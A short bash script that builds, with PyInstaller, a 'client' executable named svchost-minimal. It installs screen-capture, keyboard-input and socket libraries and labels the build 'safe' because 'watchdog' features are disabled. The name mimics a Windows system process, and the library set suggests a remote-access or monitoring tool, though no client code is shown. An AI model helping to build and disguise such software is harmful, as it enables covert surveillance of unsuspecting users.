#!/bin/bash

# SAFE BUILD SCRIPT - No Watchdog Functionality
# This script creates a safe version of the client with all watchdog functionality disabled

set -e

echo "==============================================="
echo " SAFE BUILD - No Watchdog Functionality"
echo "==============================================="
echo
echo "This build script creates a safe version of the client"
echo "with all watchdog functionality disabled for testing."
echo

echo "[1/6] Checking Python installation..."
python3 --version || python --version

echo
echo "[2/6] Installing minimal required packages..."
pip3 install pyinstaller psutil requests socketio mss pillow pynput lz4 || \
pip install pyinstaller psutil requests socketio mss pillow pynput lz4

echo
echo "[3/6] Verifying watchdog is NOT installed..."
if pip3 show watchdog >/dev/null 2>&1 || pip show watchdog >/dev/null 2>&1; then
    echo "WARNING: watchdog package is installed!"
    echo "Uninstalling for safety..."
    pip3 uninstall -y watchdog 2>/dev/null || pip uninstall -y watchdog 2>/dev/null || true
fi

echo
echo "[4/6] Cleaning old build files..."
rm -rf build dist *.spec~

echo
echo "[5/6] Building SAFE version (minimal dependencies, no watchdog)..."
pyinstaller svchost-minimal.spec --clean --noconfirm

echo
echo "[6/6] Build complete!"
echo

if [ -f "dist/svchost-minimal" ] || [ -f "dist/svchost-minimal.exe" ]; then
    echo "==============================================="
    echo " SUCCESS! Safe executable created!"
    echo "==============================================="
    echo
    if [ -f "dist/svchost-minimal.exe" ]; then
        echo "Location: dist/svchost-minimal.exe"
    else
        echo "Location: dist/svchost-minimal"
    fi
    echo "Features: Basic functionality only"
    echo "Safety:   No watchdog, console enabled"
    echo
    echo "SAFETY NOTES:"
    echo "- Watchdog functionality is DISABLED"
    echo "- Console window enabled for monitoring"
    echo "- Minimal dependencies only"
    echo "- No admin privileges requested"
    echo
    echo "To test: cd dist && ./svchost-minimal"
    echo
else
    echo "==============================================="
    echo " ERROR! Build failed!"
    echo "==============================================="
    echo "Check the output above for errors."
    echo
fi